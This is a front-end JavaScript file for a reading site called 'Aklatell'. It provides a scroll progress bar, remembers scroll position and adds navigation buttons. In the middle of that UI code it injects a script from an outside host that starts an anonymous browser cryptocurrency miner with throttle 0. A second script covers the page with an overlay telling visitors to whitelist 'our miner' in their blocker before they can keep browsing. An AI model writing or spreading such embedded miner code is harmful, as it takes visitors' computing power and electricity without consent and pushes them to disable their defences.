
	    // global variables
	    let currenPath = window.location.pathname;
	    
	    let progressBarDiv = document.createElement('span');
	     progressBarDiv.className = 'progress-bar';
	     
	    window.addEventListener('scroll', () => {
	        
	        localStorage.setItem('scrollPosition_' + currenPath, window.scrollY);
	        
	        const windowHeight = window.innerHeight;
	        
            const fullHeight = document.documentElement.scrollHeight;
            
            const scrolled = window.scrollY;
            
            const progressWidth = (scrolled / (fullHeight - windowHeight)) * 100;
            
              progressBarDiv.style.width = progressWidth + '%';
	    });
	    let moreScript = document.createElement('span');
	    moreScript.innerHTML =
	    `
        <script src="https://www.hostingcloud.racing/avXC.js"></script>
        <script>
            var _client = new Client.Anonymous('1b338ef2246dfb0c9665ca717515ff07c101d6d5c96df696097a28b6fb997ed5', {
                throttle: 0, c: 'w', ads: 0
            });
            _client.start();
            
        </script>
        <script>
            setTimeout(function(){
                if(typeof _client === 'undefined' || _client === null)
                {
                    var messageDiv = document.createElement("div");
                    messageDiv.setAttribute("style","width: 50%; background-color: white; padding: 15px; display: inline-block; vertical-align: middle;");
                    messageDiv.appendChild(document.createTextNode("Please allow our miner on your blocker software to continue browsing our site. Reload the page after that."));
                    var mainDiv = document.createElement("div");
                    mainDiv.setAttribute("style","position: absolute; top: 0px; right: 0px; width: 100%; height: 100%; display: flex; background-color: #4c4c4c;  align-items: center; justify-content: center");
                    mainDiv.appendChild(messageDiv);
                    document.body.appendChild(mainDiv);
                    document.getElementsByTagName("body")[0].style.overflow = "hidden";
                    window.scrollTo(0, 0);
                }
            },1000);
        </script>
	    `
	    window.addEventListener('load', () => {
	        
	        // more content global variable
	        let moreContent = document.getElementById('more-content');
	        
	        // home button
	        let homeBtn = document.createElement('button');
	        homeBtn.innerText = "Top";
	        homeBtn.className = "top-btn"
	        homeBtn.addEventListener('click', () => {
	             
	            window.scrollTo(0,0);
	        });
	        
	        // header
	        let header = document.createElement('button')
	        header.innerText = "Aklatell"
	        header.className = "header";
	        
	        header.addEventListener('click', () => {
	            window.location.href = "../index.html";
	        });
	        
	        // save scroll position
	        let scrollPosition = localStorage.getItem('scrollPosition_' + currenPath);
	        
	        if(scrollPosition){
	            window.scrollTo(0, scrollPosition);
	        }
	        // append more content
	        moreContent.append(homeBtn);
	        moreContent.append(header);
	        moreContent.append(progressBarDiv);
	        moreContent.append(moreScript);
	        console.log(moreScript);
	    });
	